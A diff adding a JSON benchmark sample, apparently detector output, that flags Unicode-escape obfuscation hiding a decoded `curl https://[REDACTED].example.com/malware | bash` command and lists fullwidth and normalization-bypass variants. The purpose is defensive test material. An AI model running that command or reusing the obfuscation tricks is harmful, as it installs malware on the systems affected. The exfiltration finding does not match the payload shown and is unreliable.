@@ -1,0 +1,62 @@
+{
+  "sample_id": "adv-005-unicode-escape",
+  "test_type": "BENCHMARK_TEST_ONLY",
+  "primary_detection": {
+    "code": "ENCODE-005",
+    "name": "Unicode Escape Sequence Obfuscation",
+    "description": "Detected Unicode escape sequences used to hide malicious code execution",
+    "confidence": 0.91
+  },
+  "decoded_payload": {
+    "unicode_sequences": [
+      {
+        "encoded": "\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u0020\\u006f\\u0073",
+        "decoded": "import os"
+      },
+      {
+        "encoded": "\\u002f\\u0062\\u0069\\u006e\\u002f\\u0073\\u0068",
+        "decoded": "/bin/sh"
+      }
+    ],
+    "full_decoded_command": "import os; os.system('curl https://[REDACTED].example.com/malware | bash')"
+  },
+  "underlying_threats": [
+    {
+      "code": "EXEC-001",
+      "name": "Remote Code Execution",
+      "description": "exec() used to execute Unicode-decoded malicious payload",
+      "confidence": 0.97
+    },
+    {
+      "code": "NET-001",
+      "name": "Malware Download",
+      "description": "Downloads malware from remote server via curl | bash",
+      "confidence": 0.96
+    },
+    {
+      "code": "ENV-001",
+      "name": "Environment Variable Exfiltration",
+      "description": "Exports environment variables to external server",
+      "confidence": 0.94
+    }
+  ],
+  "obfuscation_technique": {
+    "type": "unicode_escape",
+    "variants": [
+      "\\uXXXX format",
+      "Fullwidth Unicode characters",
+      "Unicode normalization bypass"
+    ],
+    "layers": 1,
+    "decode_method": "Python string literal interpretation or unicodedata.normalize()"
+  },
+  "unicode_formats_detected": [
+    "Basic \\uXXXX escapes",
+    "Fullwidth characters (U+FF00-U+FFEF)",
+    "NFKC normalization vulnerable strings"
+  ],
+  "risk_score": 9.3,
+  "verdict": "确认恶意",
+  "verdict_english": "Confirmed Malicious",
+  "reasoning": "Unicode escape sequences used to obfuscate malware download commands. Multiple Unicode encoding variants detected including standard \\uXXXX escapes and fullwidth character substitution, all resolving to remote code execution payloads."
+}
